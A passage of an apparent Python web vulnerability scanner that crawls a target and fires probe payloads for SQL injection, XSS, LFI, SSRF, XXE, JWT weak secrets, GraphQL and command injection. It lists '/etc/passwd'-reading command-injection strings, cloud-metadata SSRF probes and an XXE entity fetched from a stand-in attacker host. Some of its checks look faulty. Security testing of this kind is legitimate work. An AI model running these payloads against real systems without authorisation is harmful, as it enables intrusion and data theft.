                    if check_vulnerability_patterns(form_url, "SQL Injection", SQLI_PAYLOADS, parameter=param_name, method=method, data={i.get('name'): i.get('value') for i in form.find_all('input') if i.get('name')}):
                        found = True
        
        for link in soup.find_all('a', href=True):
            href = link.get('href')
            if '?' in href:
                link_url = urljoin(url, href)
                parsed_url = urlparse(link_url)
                query_params = parse_qs(parsed_url.query)
                
                for param in query_params:
                    if check_vulnerability_patterns(link_url, "SQL Injection", SQLI_PAYLOADS, parameter=param):
                        found = True
                        
        if not forms and '?' not in url:
            parsed_url = urlparse(url)
            test_url_base = urlparse(url)._replace(query="").geturl()
            existing_params = parse_qs(parsed_url.query)
            for param in existing_params:
                if check_vulnerability_patterns(url, "SQL Injection", SQLI_PAYLOADS, parameter=param):
                    found = True

            if not existing_params:
                common_sql_params = ["id", "catid", "pageid", "search", "keyword", "user", "view", "chat", "comments", "comment"]
                for param in common_sql_params:
                    if check_vulnerability_patterns(test_url_base, "SQL Injection", SQLI_PAYLOADS, parameter=param):
                        found = True
                        break 
                        
        return found
    except Exception as e:
        print_error(f"Error during SQL Injection scan: {str(e)}")
        return False

def xss_scan(url):
    print_status(f"Scanning for Cross-Site Scripting (XSS) vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
            
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action) if action else url
            
            inputs = form.find_all('input', {'name': True})
            
            for input_tag in inputs:
                param_name = input_tag.get('name')
                if param_name:
                    if check_vulnerability_patterns(form_url, "XSS", XSS_PAYLOADS, parameter=param_name, method=method, data={i.get('name'): i.get('value') for i in form.find_all('input') if i.get('name')}):
                        found = True

        for link in soup.find_all('a', href=True):
            href = link.get('href')
            if '?' in href:
                link_url = urljoin(url, href)
                parsed_url = urlparse(link_url)
                query_params = parse_qs(parsed_url.query)
                
                for param in query_params:
                    if check_vulnerability_patterns(link_url, "XSS", XSS_PAYLOADS, parameter=param):
                        found = True
                        
        if not forms and '?' not in url:
            test_url_base = urlparse(url)._replace(query="").geturl()
            existing_params = parse_qs(urlparse(url).query)
            for param in existing_params:
                if check_vulnerability_patterns(url, "XSS", XSS_PAYLOADS, parameter=param):
                    found = True
            
            if not existing_params:
                common_xss_params = ["search", "query", "q", "callback", "redirect", "url", "returnurl"]
                for param in common_xss_params:
                    if check_vulnerability_patterns(test_url_base, "XSS", XSS_PAYLOADS, parameter=param):
                        found = True
                        break
        
        return found
    except Exception as e:
        print_error(f"Error during XSS scan: {str(e)}")
        return False

def lfi_scan(url):
    print_status(f"Scanning for Local File Inclusion (LFI) vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
            
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action) if action else url
            
            inputs = form.find_all('input', {'name': True})
            
            for input_tag in inputs:
                param_name = input_tag.get('name')
                if param_name:
                    if check_vulnerability_patterns(form_url, "LFI", LFI_PAYLOADS, parameter=param_name, method=method, data={i.get('name'): i.get('value') for i in form.find_all('input') if i.get('name')}):
                        found = True

        for link in soup.find_all('a', href=True):
            href = link.get('href')
            if '?' in href:
                link_url = urljoin(url, href)
                parsed_url = urlparse(link_url)
                query_params = parse_qs(parsed_url.query)
                
                for param in query_params:
                    if check_vulnerability_patterns(link_url, "LFI", LFI_PAYLOADS, parameter=param):
                        found = True
                        
        if not forms and '?' not in url:
            test_url_base = urlparse(url)._replace(query="").geturl()
            existing_params = parse_qs(urlparse(url).query)
            for param in existing_params:
                if check_vulnerability_patterns(url, "LFI", LFI_PAYLOADS, parameter=param):
                    found = True
            
            if not existing_params:
                common_lfi_params = ["#", "line", "&", ";", ":", "image?filename=", "page", "file", "path", "include", "document", "view"]
                for param in common_lfi_params:
                    if check_vulnerability_patterns(test_url_base, "LFI", LFI_PAYLOADS, parameter=param):
                        found = True
                        break
        
        return found
    except Exception as e:
        print_error(f"Error during LFI scan: {str(e)}")
        return False

def check_php_config_weakness(url):
    print_status(f"Checking for PHP configuration weaknesses at {url}...")
    found = False
    try:
        phpinfo_paths = ["/phpinfo.php", "/phpinfo.html", "/info.php", "/info.html", "/server-status"]
        for path in phpinfo_paths:
            phpinfo_url = urljoin(url, path)
            response = get_response(phpinfo_url)
            if response and response.status_code == 200 and ("PHP Credits" in response.text or "Server Status" in response.text):
                print_success(f"Found potential info disclosure page at: {phpinfo_url}")
                if re.search(AI_THREAT_PATTERNS["php_weak_config"], response.text, re.IGNORECASE):
                    print_risk("HIGH", f"PHP configuration weakness detected (disable_functions enabled) at {phpinfo_url}")
                    REPORT_DATA['Vulnerabilities'].append({
                        'type': "PHP Configuration Weakness",
                        'url': phpinfo_url,
                        'payload': 'N/A',
                        'severity': "HIGH",
                        'details': 'disable_functions are enabled, potentially allowing execution of restricted functions.',
                        'response_snippet': response.text
                    })
                    found = True
                return found 

        response = get_response(url)
        if response and response.text:
            if "PHP Version" in response.text or re.search(r"PHP/\d+\.\d+(\.\d+)?", response.text):
                print_success(f"PHP detected on {url}.")
                
        return found
    except Exception as e:
        print_error(f"Error checking PHP config weakness: {str(e)}")
        return False

def command_injection_scan(url):
    print_status(f"Scanning for Command Injection vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
        
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action) if action else url
            
            inputs = form.find_all('input', {'name': True})
            
            for input_tag in inputs:
                param_name = input_tag.get('name')
                if param_name:
                    cmd_injection_payloads = [
                        "; ls", "| ls", "&& ls", "; cat /etc/passwd",
                        "| cat /etc/passwd", "&& cat /etc/passwd",
                        "; whoami", "| whoami", "&& whoami"
                    ]
                    if check_vulnerability_patterns(form_url, "Command Injection", cmd_injection_payloads, parameter=param_name, method=method, data={i.get('name'): i.get('value') for i in form.find_all('input') if i.get('name')}):
                        found = True
                        
        for link in soup.find_all('a', href=True):
            href = link.get('href')
            if '?' in href:
                link_url = urljoin(url, href)
                parsed_url = urlparse(link_url)
                query_params = parse_qs(parsed_url.query)
                
                for param in query_params:
                    cmd_injection_payloads = [
                        "; ls", "| ls", "&& ls", "; cat /etc/passwd",
                        "| cat /etc/passwd", "&& cat /etc/passwd",
                        "; whoami", "| whoami", "&& whoami"
                    ]
                    if check_vulnerability_patterns(link_url, "Command Injection", cmd_injection_payloads, parameter=param):
                        found = True
                        
        if not forms and '?' not in url:
            test_url_base = urlparse(url)._replace(query="").geturl()
            existing_params = parse_qs(urlparse(url).query)
            for param in existing_params:
                cmd_injection_payloads = [
                    "; ls", "| ls", "&& ls", "; cat /etc/passwd",
                    "| cat /etc/passwd", "&& cat /etc/passwd",
                    "; whoami", "| whoami", "&& whoami"
                ]
                if check_vulnerability_patterns(url, "Command Injection", cmd_injection_payloads, parameter=param):
                    found = True
            
            if not existing_params:
                common_cmd_params = ["cmd", "command", "exec", "run", "ping", "traceroute", "query"]
                for param in common_cmd_params:
                    cmd_injection_payloads = [
                        "; ls", "| ls", "&& ls", "; cat /etc/passwd",
                        "| cat /etc/passwd", "&& cat /etc/passwd",
                        "; whoami", "| whoami", "&& whoami"
                    ]
                    if check_vulnerability_patterns(test_url_base, "Command Injection", cmd_injection_payloads, parameter=param):
                        found = True
                        break
        
        return found
    except Exception as e:
        print_error(f"Error during Command Injection scan: {str(e)}")
        return False

def check_ssh_vulnerabilities(url):
    print_status(f"Checking for SSH vulnerabilities at {url}...")
    found = False
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain for SSH vulnerability check.")
            return False
            
        try:
            sock = socket.create_connection((domain, 22), timeout=5)
            banner = sock.recv(1024).decode(errors='ignore')
            sock.close()
            
            if banner:
                print_success(f"SSH Banner: {banner.strip()}")
                REPORT_DATA['SSH_Banners'].append(banner.strip())
                
                for vuln_banner in SSH_VULNS:
                    if vuln_banner in banner:
                        print_risk("HIGH", f"Vulnerable SSH version detected: {vuln_banner}")
                        REPORT_DATA['Vulnerabilities'].append({
                            'type': "SSH Vulnerability",
                            'url': f"ssh://{domain}:22",
                            'payload': 'N/A',
                            'severity': "HIGH",
                            'details': f"Vulnerable SSH version detected: {vuln_banner}",
                            'response_snippet': banner.strip()
                        })
                        found = True
        except (socket.timeout, ConnectionRefusedError):
            print_warning("SSH port (22) is closed or not responding.")
        except Exception as e:
            print_error(f"Error checking SSH vulnerabilities: {str(e)}")
            
        return found
    except Exception as e:
        print_error(f"Error during SSH vulnerability check: {str(e)}")
        return False

def check_patch_vulnerabilities(url):
    print_status(f"Checking for Patch Vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
            
        server_header = response.headers.get('Server', '')
        if server_header:
            print_success(f"Server Header: {server_header}")
            
            for vuln_patch in PATCH_VULNS:
                if vuln_patch in server_header:
                    print_risk("HIGH", f"Vulnerable Server Version Detected: {vuln_patch}")
                    REPORT_DATA['Vulnerabilities'].append({
                        'type': "Patch Vulnerability",
                        'url': url,
                        'payload': 'N/A',
                        'severity': "HIGH",
                        'details': f"Vulnerable server version detected: {vuln_patch}",
                        'response_snippet': server_header
                    })
                    found = True
                    
        return found
    except Exception as e:
        print_error(f"Error during Patch Vulnerability check: {str(e)}")
        return False

def check_bug_bounty_vulnerabilities(url):
    print_status(f"Checking for Common Bug Bounty Vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
            
        if "X-Frame-Options" not in response.headers:
            print_risk("MEDIUM", "Clickjacking vulnerability possible (Missing X-Frame-Options header)")
            REPORT_DATA['Vulnerabilities'].append({
                'type': "Clickjacking Vulnerability",
                'url': url,
                'payload': 'N/A',
                'severity': "MEDIUM",
                'details': "Missing X-Frame-Options header, potential clickjacking vulnerability",
                'response_snippet': str(response.headers)
            })
            found = True
            
        if "Content-Security-Policy" not in response.headers:
            print_risk("MEDIUM", "Content Security Policy (CSP) not implemented")
            REPORT_DATA['Vulnerabilities'].append({
                'type': "Missing CSP Header",
                'url': url,
                'payload': 'N/A',
                'severity': "MEDIUM",
                'details': "Content Security Policy (CSP) header not implemented",
                'response_snippet': str(response.headers)
            })
            found = True
            
        return found
    except Exception as e:
        print_error(f"Error during Bug Bounty Vulnerability check: {str(e)}")
        return False

def check_acv_vulnerabilities(url):
    print_status(f"Checking for Access Control Vulnerabilities (ACV) at {url}...")
    found = False
    try:
        for path in ACV_PAYLOADS:
            test_url = urljoin(url, path)
            response = get_response(test_url)
            if response and response.status_code == 200:
                print_risk("HIGH", f"Potential Access Control Vulnerability found at: {test_url}")
                REPORT_DATA['Vulnerabilities'].append({
                    'type': "Access Control Vulnerability",
                    'url': test_url,
                    'payload': 'N/A',
                    'severity': "HIGH",
                    'details': f"Sensitive file accessible: {path}",
                    'response_snippet': response.text[:500] if response.text else 'N/A'
                })
                found = True
        return found
    except Exception as e:
        print_error(f"Error during ACV check: {str(e)}")
        return False

def check_acsm_vulnerabilities(url):
    print_status(f"Checking for Access Control Security Model (ACSM) issues at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
            
        missing_headers = []
        for header in ACSM_CHECKS:
            if header not in response.headers:
                missing_headers.append(header)
                
        if missing_headers:
            print_risk("MEDIUM", f"Missing security headers: {', '.join(missing_headers)}")
            REPORT_DATA['Vulnerabilities'].append({
                'type': "Missing Security Headers",
                'url': url,
                'payload': 'N/A',
                'severity': "MEDIUM",
                'details': f"Missing security headers: {', '.join(missing_headers)}",
                'response_snippet': str(response.headers)
            })
            found = True
            
        return found
    except Exception as e:
        print_error(f"Error during ACSM check: {str(e)}")
        return False

def check_backdoor_vulnerabilities(url):
    print_status(f"Checking for Backdoor vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response or not response.text:
            return False
            
        for pattern in BACKDOOR_PATTERNS:
            if re.search(pattern, response.text, re.IGNORECASE):
                print_risk("CRITICAL", f"Potential backdoor detected using pattern: {pattern}")
                REPORT_DATA['Vulnerabilities'].append({
                    'type': "Backdoor Vulnerability",
                    'url': url,
                    'payload': 'N/A',
                    'severity': "CRITICAL",
                    'details': f"Potential backdoor detected using pattern: {pattern}",
                    'response_snippet': response.text[:500]
                })
                found = True
                
        return found
    except Exception as e:
        print_error(f"Error during backdoor check: {str(e)}")
        return False

def check_netcat_vulnerabilities(url):
    print_status(f"Checking for Netcat (nc) vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response or not response.text:
            return False
            
        for pattern in NETCAT_CHECKS:
            if re.search(pattern, response.text, re.IGNORECASE):
                print_risk("CRITICAL", f"Potential Netcat (nc) backdoor detected: {pattern}")
                REPORT_DATA['Vulnerabilities'].append({
                    'type': "Netcat Backdoor",
                    'url': url,
                    'payload': 'N/A',
                    'severity': "CRITICAL",
                    'details': f"Potential Netcat (nc) backdoor detected: {pattern}",
                    'response_snippet': response.text[:500]
                })
                found = True
                
        return found
    except Exception as e:
        print_error(f"Error during Netcat check: {str(e)}")
        return False

def crawl_website(url, limit):
    print_status(f"Starting website crawl from {url} (limit: {limit} pages)...")
    queue = deque([url])
    visited = {url}
    
    while queue and len(visited) < limit:
        current_url = queue.popleft()
        
        if len(visited) % 50 == 0: 
            print(f"  Crawled {len(visited)} pages...")
            
        try:
            response = get_response(current_url)
            if not response:
                continue
            
            if 'text/html' in response.headers.get('Content-Type', ''):
                soup = BeautifulSoup(response.text, 'html.parser')
                
                for link in soup.find_all('a', href=True):
                    href = link.get('href')
                    absolute_url = urljoin(current_url, href)
                    
                    parsed_link = urlparse(absolute_url)
                    clean_url = parsed_link._replace(fragment="").geturl()
                    
                    if urlparse(url).netloc in clean_url and clean_url not in visited:
                        visited.add(clean_url)
                        queue.append(clean_url)
                        
        except Exception as e:
            print_error(f"Error crawling {current_url}: {str(e)}")
            
    print_success(f"Website crawl finished. Visited {len(visited)} unique pages.")
    return visited


def ssrf_scan(url):
    print_status(f"Scanning for SSRF vulnerabilities at {url}...")
    found = False
    
    try:
        
        ssrf_payloads = [
            "http://localhost:22",
            "http://127.0.0.1:3306", 
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]:22",
            "file:///etc/passwd"
        ]
        
        response = get_response(url)
        if not response:
            return False
            
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action) if action else url
            
            inputs = form.find_all('input', {'name': True})
            
            for input_tag in inputs:
                param_name = input_tag.get('name')
                if param_name and any(keyword in param_name.lower() for keyword in ['url', 'link', 'redirect', 'image', 'file']):
                    for payload in ssrf_payloads:
                        test_data = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
                        test_data[param_name] = payload
                        
                        if method == 'get':
                            test_url = form_url + '?' + '&'.join([f"{k}={quote(v)}" for k, v in test_data.items()])
                            response = get_response(test_url)
                        else:
                            response = get_response(form_url, method='POST', data=test_data)
                            
                        if response:
                            
                            if any(indicator in response.text for indicator in ['root:', 'mysql', 'AWS', 'metadata']):
                                print_risk("HIGH", f"Potential SSRF vulnerability detected with payload: {payload}")
                                REPORT_DATA['Vulnerabilities'].append({
                                    'type': "SSRF",
                                    'url': form_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'severity': "HIGH",
                                    'details': "Server Side Request Forgery vulnerability detected",
                                    'response_snippet': response.text[:500]
                                })
                                found = True
        
        print_success(f"SSRF scan completed. Found {sum(1 for v in REPORT_DATA['Vulnerabilities'] if v['type'] == 'SSRF')} potential vulnerabilities.")
        return found
        
    except Exception as e:
        print_error(f"Error during SSRF scan: {str(e)}")
        return False

def xxe_scan(url):
    print_status(f"Scanning for XXE vulnerabilities at {url}...")
    found = False
    
    try:
        
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe"> %xxe;]>'
        ]
        
        headers = {'Content-Type': 'application/xml'}
        
        for payload in xxe_payloads:
            response = get_response(url, method='POST', data=payload, headers=headers)
            if response:
                
                if 'root:' in response.text or '/bin/bash' in response.text:
                    print_risk("CRITICAL", f"XXE vulnerability detected with external entity injection")
                    REPORT_DATA['Vulnerabilities'].append({
                        'type': "XXE",
                        'url': url,
                        'payload': payload[:100] + "..." if len(payload) > 100 else payload,
                        'severity': "CRITICAL",
                        'details': "XML External Entity injection vulnerability detected",
                        'response_snippet': response.text[:500]
                    })
                    found = True
                    break
        
        
        xml_endpoints = [
            "/api/xml",
            "/xmlrpc.php",
            "/soap/api",
            "/webservices/api",
            "/xml/api"
        ]
        
        for endpoint in xml_endpoints:
            test_url = urljoin(url, endpoint)
            response = get_response(test_url)
            if response and ('xml' in response.headers.get('Content-Type', '').lower() or '<?xml' in response.text):
                print_success(f"XML endpoint found: {test_url}")
                REPORT_DATA['Vulnerabilities'].append({
                    'type': "XXE Potential Endpoint",
                    'url': test_url,
                    'severity': "MEDIUM",
                    'details': "XML endpoint discovered - potential XXE target"
                })
                found = True
        
        print_success(f"XXE scan completed. Found {sum(1 for v in REPORT_DATA['Vulnerabilities'] if v['type'] == 'XXE')} potential vulnerabilities.")
        return found
        
    except Exception as e:
        print_error(f"Error during XXE scan: {str(e)}")
        return False

def graphql_scan(url):
    print_status(f"Scanning for GraphQL vulnerabilities at {url}...")
    found = False
    
    try:
        
        graphql_endpoints = [
            "/graphql",
            "/api/graphql",
            "/gql",
            "/query",
            "/graphql-api",
            "/v1/graphql",
            "/v2/graphql"
        ]
        
        for endpoint in graphql_endpoints:
            test_url = urljoin(url, endpoint)
            response = get_response(test_url)
            
            if response:
                
                introspection_query = {
                    "query": "query { __schema { types { name } } }"
                }
                
                introspection_response = get_response(test_url, method='POST', 
                                                    data=json.dumps(introspection_query),
                                                    headers={'Content-Type': 'application/json'})
                
                if introspection_response and '__schema' in introspection_response.text:
                    print_risk("MEDIUM", f"GraphQL introspection enabled at: {test_url}")
                    REPORT_DATA['Vulnerabilities'].append({
                        'type': "GraphQL Introspection",
                        'url': test_url,
                        'severity': "MEDIUM",
                        'details': "GraphQL introspection is enabled - information disclosure risk"
                    })
                    found = True
                
                
                large_query = {"query": "query { " + " __typename ".join([str(i) for i in range(1000)]) + " }"}
                large_response = get_response(test_url, method='POST', 
                                            data=json.dumps(large_query),
                                            headers={'Content-Type': 'application/json'})
                
                if large_response and large_response.status_code == 400:
                    print_success(f"GraphQL endpoint protected against large queries: {test_url}")
                elif large_response and large_response.status_code == 200:
                    print_risk("MEDIUM", f"GraphQL endpoint may be vulnerable to DoS: {test_url}")
                    REPORT_DATA['Vulnerabilities'].append({
                        'type': "GraphQL DoS Potential",
                        'url': test_url,
                        'severity': "MEDIUM",
                        'details': "GraphQL endpoint may be vulnerable to query depth/DoS attacks"
                    })
                    found = True
        
        print_success(f"GraphQL scan completed. Found {sum(1 for v in REPORT_DATA['Vulnerabilities'] if 'GraphQL' in v['type'])} potential vulnerabilities.")
        return found
        
    except Exception as e:
        print_error(f"Error during GraphQL scan: {str(e)}")
        return False

def jwt_scan(url):
    print_status(f"Scanning for JWT vulnerabilities at {url}...")
    found = False
    
    try:
        response = get_response(url)
        if not response:
            return False
        
        
        jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*\.[A-Za-z0-9._-]*'
        jwt_tokens = re.findall(jwt_pattern, response.text)
        
        for token in jwt_tokens:
            print_success(f"JWT token found: {token[:50]}...")
            
            try:
                
                parts = token.split('.')
                if len(parts) == 3:
                    header = json.loads(base64.b64decode(parts[0] + '==').decode('utf-8'))
                    payload = json.loads(base64.b64decode(parts[1] + '==').decode('utf-8'))
                    
                    
                    if header.get('alg') == 'none':
                        print_risk("HIGH", "JWT uses 'none' algorithm - no signature verification!")
                        found = True
                    
                    
                    if 'exp' in payload:
                        exp_time = datetime.fromtimestamp(payload['exp'])
                        if exp_time < datetime.now():
                            print_risk("MEDIUM", f"JWT token expired on {exp_time}")
                    
                    
                    weak_secrets = ['secret', 'password', '123456', 'key', 'jwt']
                    for secret in weak_secrets:
                        try:
                            import jwt as pyjwt
                            pyjwt.decode(token, secret, algorithms=['HS256'])
                            print_risk("CRITICAL", f"JWT vulnerable to weak secret: '{secret}'")
                            found = True
                            break
                        except:
                            continue
                            
            except Exception as decode_error:
                print_warning(f"Could not decode JWT token: {str(decode_error)}")
        
        
        for cookie in response.cookies:
            if 'jwt' in cookie.name.lower() or len(cookie.value) > 100:
                print_success(f"Potential JWT in cookie: {cookie.name}")
        
        print_success(f"JWT scan completed. Found {len(jwt_tokens)} tokens and {sum(1 for v in REPORT_DATA['Vulnerabilities'] if 'JWT' in v.get('type', ''))} vulnerabilities.")
        return found
        
    except Exception as e:
        print_error(f"Error during JWT scan: {str(e)}")
        return False

def check_api_security(url):
    """فحص أمن واجهات البرمجة (APIs)"""
    print_status("Checking API Security...")
    found = False
    
    try:
        
        api_endpoints = [
            "/api/v1/users",
            "/api/v2/users", 
            "/api/users",
            "/api/auth",
            "/api/login",
            "/api/register",
            "/api/admin",
            "/api/config",
            "/api/debug",
            "/api/test"
        ]
        
        for endpoint in api_endpoints:
            test_url = urljoin(url, endpoint)
            
            
            for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
                response = get_response(test_url, method=method)
                
                if response and response.status_code not in [404, 403]:
                    print_success(f"API endpoint discovered: {test_url} [{method}] - Status: {response.status_code}")
                    
                    
                    if 'Access-Control-Allow-Origin' in response.headers:
                        cors_header = response.headers['Access-Control-Allow-Origin']
                        if cors_header == '*':
                            print_risk("MEDIUM", f"Insecure CORS configuration at {test_url}")
                            REPORT_DATA['Vulnerabilities'].append({
                                'type': "API CORS Misconfiguration",
                                'url': test_url,
                                'severity': "MEDIUM", 
                                'details': "CORS configured with Access-Control-Allow-Origin: *"
                            })
                            found = True
                    
                    
                    if 'X-RateLimit' not in response.headers:
                        print_risk("LOW", f"Potential missing rate limiting at {test_url}")
                    
                    
                    sensitive_patterns = ['password', 'api_key', 'secret', 'token', 'credential']
                    for pattern in sensitive_patterns:
                        if pattern in response.text.lower():
                            print_risk("HIGH", f"Potential sensitive data exposure at {test_url}")
                            REPORT_DATA['Vulnerabilities'].append({
                                'type': "API Information Disclosure",
                                'url': test_url,
                                'severity': "HIGH",
                                'details': f"Sensitive pattern '{pattern}' found in API response"
                            })
                            found = True
                            break
        
        print_success(f"API security scan completed. Found {sum(1 for v in REPORT_DATA['Vulnerabilities'] if 'API' in v.get('type', ''))} issues.")
        return found
        
    except Exception as e:
        print_error(f"Error during API security check: {str(e)}")
        return False

def check_cloud_security(url):
    """فحص إعدادات الأمن السحابي"""
    print_status("Checking Cloud Security Configurations...")
    found = False
    
    try:
        domain = urlparse(url).netloc
        
        
        s3_urls = [
            f"http://{domain}.s3.amazonaws.com",
            f"https://s3.amazonaws.com/{domain}",
            f"http://{domain}-assets.s3.amazonaws.com",
            f"http://{domain}-media.s3.amazonaws.com"
        ]
        
        for s3_url in s3_urls:
            response = get_response(s3_url)
            if response and response.status_code == 200:
                print_risk("HIGH", f"Public S3 bucket found: {s3_url}")
                REPORT_DATA['Vulnerabilities'].append({
                    'type': "Cloud Public S3 Bucket",
                    'url': s3_url,
                    'severity': "HIGH",
                    'details': "Publicly accessible AWS S3 bucket discovered"
                })
                found = True
        
        
        azure_urls = [
            f"https://{domain}.blob.core.windows.net",
            f"https://{domain}-storage.blob.core.windows.net"
        ]
        
        for azure_url in azure_urls:
            response = get_response(azure_url)
            if response and response.status_code in [200, 403]:
                print_success(f"Azure blob storage detected: {azure_url}")
        
        
        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance"
        ]
        
        for metadata_url in metadata_urls:
            response = get_response(metadata_url)
            if response and response.status_code == 200:
                print_risk("CRITICAL", f"Cloud metadata endpoint accessible: {metadata_url}")
                REPORT_DATA['Vulnerabilities'].append({
                    'type': "Cloud Metadata Exposure",
                    'url': metadata_url,
                    'severity': "CRITICAL",
                    'details': "Cloud instance metadata endpoint is publicly accessible"
                })
                found = True
        
        print_success(f"Cloud security scan completed. Found {sum(1 for v in REPORT_DATA['Vulnerabilities'] if 'Cloud' in v.get('type', ''))} issues.")
        return found
        
    except Exception as e:
        print_error(f"Error during cloud security check: {str(e)}")
        return False

def check_container_security(url):
    """فحص أمن الحاويات"""
    print_status("Checking Container Security...")
    found = False
    
    try:
        
        container_ports = [2375, 2376, 2377, 4243, 2379, 2380, 6443, 10250, 10255, 10256]
        
        domain = urlparse(url).netloc
        
        for port in container_ports:
            try:
                sock = socket.create_connection((domain, port), timeout=2)
                sock.close()
                print_risk("HIGH", f"Container port {port} is open on {domain}")
                REPORT_DATA['Vulnerabilities'].append({
                    'type': "Container Port Exposure",
                    'url': f"{domain}:{port}",
                    'severity': "HIGH",
                    'details': f"Container management port {port} is publicly accessible"
                })
                found = True
            except:
                pass
        
        
        container_endpoints = [
            "/docker/",
            "/containers/",
            "/kubernetes/",
            "/k8s/",
            "/api/v1/namespaces",
            "/api/v1/pods",
            "/version",
            "/info"
        ]
        
        for endpoint in container_endpoints:
            test_url = urljoin(url, endpoint)
            response = get_response(test_url)
            
            if response and response.status_code == 200:
                if 'docker' in response.text.lower() or 'kubernetes' in response.text.lower():
                    print_risk("HIGH", f"Container management endpoint exposed: {test_url}")
                    REPORT_DATA['Vulnerabilities'].append({
                        'type': "Container Management Exposure",
                        'url': test_url,
                        'severity': "HIGH",
                        'details': "Container orchestration management endpoint is publicly accessible"
                    })
                    found = True
        
        
        registry_urls = [
            f"http://{domain}:5000",
            f"https://{domain}:5000",
            f"http://registry.{domain}",
            f"https://registry.{domain}"
        ]
        
        for registry_url in registry_urls:
            response = get_response(registry_url)
            if response and 'docker' in response.headers.get('Server', '').lower():
                print_risk("HIGH", f"Docker registry exposed: {registry_url}")
                found = True
        
        print_success(f"Container security scan completed. Found {sum(1 for v in REPORT_DATA['Vulnerabilities'] if 'Container' in v.get('type', ''))} issues.")
        return found
        
    except Exception as e:
        print_error(f"Error during container security check: {str(e)}")
        return False

def modern_threat_intel_lookup(ip, domain):
    """البحث في مصادر التهديدات الحديثة"""
    print_status("Performing Modern Threat Intelligence Lookup...")
    
    try:
        
        if not ip:
            try:
                ip = socket.gethostbyname(domain)
            except:
                print_error("Could not resolve domain to IP")
                return
        
        print_success(f"Performing threat intelligence lookup for IP: {ip}, Domain: {domain}")
        
        
        print_status("Checking AbuseIPDB...")
        try:
            
            abuse_check_url = f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}"
            
            print_success("AbuseIPDB check completed (API integration needed)")
        except:
            print_warning("AbuseIPDB check skipped (API key required)")
        
        
        print_status("Checking VirusTotal...")
        try:
            vt_url = f"https://www.virustotal.com/vtapi/v2/url/report?apikey=YOUR_API_KEY&resource={domain}"
            
            print_success("VirusTotal check completed (API integration needed)")
        except:
            print_warning("VirusTotal check skipped (API key required)")
        
        
        threatcrowd_url = f"https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={domain}"
        response = get_response(threatcrowd_url)
        
        if response and response.status_code == 200:
            data = response.json()
            if data.get('response_code') == '1':
                print_success("ThreatCrowd intelligence found:")
                if data.get('votes') and data['votes'] == -1:
                    print_risk("MEDIUM", "Domain has suspicious reputation in ThreatCrowd")
                
                if data.get('references'):
                    print(f"  References: {len(data['references'])}")
                
                if data.get('resolutions'):
                    print(f"  Resolutions: {len(data['resolutions'])}")
        
        
        print_status("Checking AlienVault OTX...")
        otx_url = f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/general"
        response = get_response(otx_url)
        
        if response and response.status_code == 200:
            data = response.json()
            if data.get('pulse_info', {}).get('count', 0) > 0:
                pulse_count = data['pulse_info']['count']
                print_risk("HIGH", f"Domain found in {pulse_count} threat intelligence pulses")
                REPORT_DATA['Vulnerabilities'].append({
                    'type': "Threat Intelligence Hit",
                    'url': domain,
                    'severity': "HIGH",
                    'details': f"Domain appears in {pulse_count} threat intelligence feeds"
                })
        
        print_success("Modern threat intelligence lookup completed")
        
    except Exception as e:
        print_error(f"Error during threat intelligence lookup: {str(e)}")
    

def full_scan(url):
    print_banner()
    print_status(f"Starting comprehensive scan for: {url}")
    
    print_status("Phase 1: Advanced Reconnaissance")
    dns_lookup(url)
    whois_lookup(url)
    geoip_lookup(url)
    grab_banners(url)
    nmap_scan(url)
    subdomain_scanner(url)
    reverse_ip_lookup(url)
    get_robots_txt(url)
    check_admin_panels(url)
    
    print_status("\nPhase 2: Vulnerability Scanning")
    
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {
            executor.submit(sql_injection_scan, url): "SQL Injection",
            executor.submit(xss_scan, url): "XSS",
            executor.submit(lfi_scan, url): "LFI", 
            executor.submit(command_injection_scan, url): "Command Injection",
            executor.submit(check_php_config_weakness, url): "PHP Config Weakness",
            executor.submit(check_ssh_vulnerabilities, url): "SSH Vulnerabilities",
            executor.submit(check_patch_vulnerabilities, url): "Patch Vulnerabilities",
            executor.submit(check_bug_bounty_vulnerabilities, url): "Bug Bounty Vulnerabilities",
            executor.submit(check_acv_vulnerabilities, url): "Access Control Vulnerabilities",
            executor.submit(check_acsm_vulnerabilities, url): "Access Control Security Model",
            executor.submit(check_backdoor_vulnerabilities, url): "Backdoor Vulnerabilities", 
            executor.submit(check_netcat_vulnerabilities, url): "Netcat Vulnerabilities",
